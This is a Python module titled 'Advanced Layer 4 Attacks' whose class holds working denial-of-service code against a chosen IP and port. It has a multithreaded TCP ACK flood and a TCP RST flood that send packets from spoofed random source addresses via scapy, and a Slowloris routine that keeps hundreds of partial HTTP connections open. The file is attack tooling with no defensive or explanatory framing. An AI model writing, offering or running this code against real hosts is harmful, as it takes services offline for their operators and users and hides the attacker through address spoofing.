#!/usr/bin/env python3
"""
Advanced Layer 4 Attacks Module
"""

import random
import socket
import threading
import time

try:
    import scapy.all as scapy
    from scapy.layers.inet import IP, TCP
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


class AdvancedLayer4Attacks:
    """Advanced Layer 4 Attack Techniques"""
    
    def __init__(self, target_ip, target_port=80):
        self.target_ip = target_ip
        self.target_port = target_port
        self.active = True
        self.connections = []
        
    def tcp_ack_flood(self, duration=60, threads=100):
        """TCP ACK Flood Attack"""
        if not SCAPY_AVAILABLE:
            print("❌ Scapy required for TCP ACK flood")
            return
            
        print(f"🚀 Starting TCP ACK flood on {self.target_ip}:{self.target_port}")
        packets_sent = 0
        
        def send_ack_packets():
            nonlocal packets_sent
            while self.active:
                try:
                    src_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
                    src_port = random.randint(1024, 65535)
                    
                    packet = IP(src=src_ip, dst=self.target_ip) / TCP(
                        sport=src_port,
                        dport=self.target_port,
                        flags="A",  # ACK flag
                        seq=random.randint(1000, 9000),
                        ack=random.randint(1000, 9000)
                    )
                    
                    scapy.send(packet, verbose=0)
                    packets_sent += 1
                    
                except Exception:
                    pass
                    
        # Start threads
        threads_list = []
        for _ in range(threads):
            t = threading.Thread(target=send_ack_packets)
            t.daemon = True
            t.start()
            threads_list.append(t)
            
        time.sleep(duration)
        self.active = False
        print(f"📊 TCP ACK flood completed. Packets sent: {packets_sent}")
        
    def tcp_rst_flood(self, duration=60, threads=100):
        """TCP RST Flood Attack"""
        if not SCAPY_AVAILABLE:
            print("❌ Scapy required for TCP RST flood")
            return
            
        print(f"🚀 Starting TCP RST flood on {self.target_ip}:{self.target_port}")
        packets_sent = 0
        
        def send_rst_packets():
            nonlocal packets_sent
            while self.active:
                try:
                    src_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
                    src_port = random.randint(1024, 65535)
                    
                    packet = IP(src=src_ip, dst=self.target_ip) / TCP(
                        sport=src_port,
                        dport=self.target_port,
                        flags="R",  # RST flag
                        seq=random.randint(1000, 9000)
                    )
                    
                    scapy.send(packet, verbose=0)
                    packets_sent += 1
                    
                except Exception:
                    pass
                    
        # Start threads
        threads_list = []
        for _ in range(threads):
            t = threading.Thread(target=send_rst_packets)
            t.daemon = True
            t.start()
            threads_list.append(t)
            
        time.sleep(duration)
        self.active = False
        print(f"📊 TCP RST flood completed. Packets sent: {packets_sent}")
        
    def slowloris_advanced(self, duration=300, connections=200):
        """Advanced Slowloris Attack"""
        print(f"🐌 Starting Advanced Slowloris on {self.target_ip}:{self.target_port}")
        
        def create_connection():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((self.target_ip, self.target_port))
                
                # Send partial HTTP request
                sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                sock.send(f"Host: {self.target_ip}\r\n".encode())
                sock.send("User-Agent: Mozilla/5.0 (compatible; Slowloris)\r\n".encode())
                sock.send("Accept-language: en-US,en,q=0.5\r\n".encode())
                
                return sock
            except:
                return None
                
        # Create initial connections
        for _ in range(connections):
            sock = create_connection()
            if sock:
                self.connections.append(sock)
                
        print(f"📊 Created {len(self.connections)} connections")
        
        start_time = time.time()
        while self.active and (time.time() - start_time) < duration:
            # Send keep-alive headers
            for sock in self.connections[:]:
                try:
                    sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                except:
                    self.connections.remove(sock)
                    # Try to create new connection
                    new_sock = create_connection()
                    if new_sock:
                        self.connections.append(new_sock)
                        
            print(f"📊 Maintaining {len(self.connections)} connections")
            time.sleep(15)
            
        # Close all connections
        for sock in self.connections:
            try:
                sock.close()
            except:
                pass
                
        print("📊 Advanced Slowloris attack completed")